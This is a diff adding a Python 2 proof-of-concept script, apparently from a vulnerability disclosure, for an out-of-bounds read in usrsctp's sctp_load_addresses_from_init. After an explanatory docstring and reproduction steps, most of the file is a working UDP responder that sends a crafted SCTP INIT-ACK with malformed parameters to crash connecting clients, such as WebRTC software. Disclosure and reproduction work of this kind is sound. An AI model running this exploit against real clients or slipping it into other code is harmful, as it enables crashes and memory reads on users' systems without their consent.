@@ -1,0 +1,76 @@
+'''
+usersctp is SCTP library used by a variety of software including WebRTC. There is a vulnerability in the sctp_load_addresses_from_init function of usersctp that can lead to a number of out-of-bound reads. The input to sctp_load_addresses_from_init is verified by calling sctp_arethere_unrecognized_parameters, however there is a difference in how these functions handle parameter bounds. The function sctp_arethere_unrecognized_parameters does not process a parameter that is partially outside of the limit of the chunk, meanwhile, sctp_load_addresses_from_init will continue processing until a parameter that is entirely outside of the chunk occurs. This means that the last parameter of a chunk is not always verified, which can lead to parameters with very short plen values being processed by sctp_load_addresses_from_init. This can lead to out-of-bounds reads whenever the plen is subtracted from the header len.
+
+To reproduce this issue:
+
+1) run the attached 'server', initack.py
+
+    python init_ack.py
+
+2) run the sample usersctp client
+
+./programs/.libs/client 127.0.0.1 7 0 8888 7777
+
+
+The client will crash.
+'''
+
+import sys
+from socket import *
+import zlib
+
+
+ECHO_PORT = 7777
+BUFSIZE = 1024
+
+def getshort(arr):
+	return ord(arr[1]) + (ord(arr[0]) << 8);
+
+
+def getlen(arr):
+	return ord(arr[0]) + (ord(arr[1]) << 8);
+
+
+def main():
+
+        server()
+
+def print_pack(pack):
+	o = ""
+	for item in pack:
+		o = o + hex(ord(item)) + " "
+	print "PACKET SENT", o
+
+def server():
+    times = 0
+    if len(sys.argv) > 2:
+        port = eval(sys.argv[2])
+    else:
+        port = ECHO_PORT
+    s = socket(AF_INET, SOCK_DGRAM)
+    s.bind(('', port))
+    print 'udp echo server ready'
+    while 1:
+        data, addr = s.recvfrom(BUFSIZE)
+	pack = ""
+	for item in data:
+		pack = pack + hex(ord(item)) + " "
+        print 'server received %r from %r' % (pack, addr)
+
+	vtag = data[16:20]
+	type = ord(data[12])
+	length = getshort(data[14:])
+
+	port = "\x00\x07" + data[0:2]
+	print "type", type, "len", length, "plen", len(data)
+	ia = "\x86\x02\x01\x00\x2a\xe6\x97\x19\x00\x2c\x7c\x9f\x18\x33\x03\xc3\x07\x00\x01\x8e\x05\x00\x07\x00\x14\x0b\x36\x14\x01\x30\x2a\xe6\x97\x19\x00\x2c\x7c\x9f\xf9\x33\x05\x80\x03\x00\x01"
+	print "vtag", hex(ord(vtag[0])), hex(ord(vtag[1])), hex(ord(vtag[2])), hex(ord(vtag[3]))
+	o = port + "\0\0\0\0" + "\0\0\0\0" + vtag + ia[1:]
+        crc = zlib.crc32(o) & 0xffffffff
+        crcb= chr(crc&0xf) + chr((crc>> 8)&0xf) + chr((crc>> 16)&0xf) + chr((crc>> 24)&0xf)
+      	o = port + vtag + crcb + ia[1:]
+	print_pack(o) 
+	s.sendto(o, addr)
+
+
+main()
